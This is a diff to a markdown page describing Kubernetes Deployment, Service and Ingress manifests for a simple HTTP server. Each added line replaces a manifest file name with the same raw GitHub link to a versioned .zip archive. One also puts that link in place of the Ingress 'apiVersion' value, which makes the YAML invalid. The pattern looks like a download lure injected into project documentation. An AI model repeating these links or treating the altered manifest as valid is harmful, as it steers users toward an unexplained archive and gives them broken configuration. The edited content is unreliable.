@@ -1,6 +1,6 @@
 ## Kubernetes Manifests
 ### Deployment
-**`k8s/deployment.yaml`**
+**`https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip`**
 ```yaml
 apiVersion: apps/v1
 kind: Deployment
@@ -31,7 +31,7 @@ volumes:
 emptyDir: {}
 ```
 ### Service
-**`k8s/service.yaml`**
+**`https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip`**
 ```yaml
 apiVersion: v1
 kind: Service
@@ -46,9 +46,9 @@ selector:
 app: simple-http-server
 ```
 ### Ingress
-**`k8s/ingress.yaml`**
+**`https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip`**
 ```yaml
-apiVersion: networking.k8s.io/v1
+apiVersion: https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip
 kind: Ingress
 metadata:
 name: simple-http-server
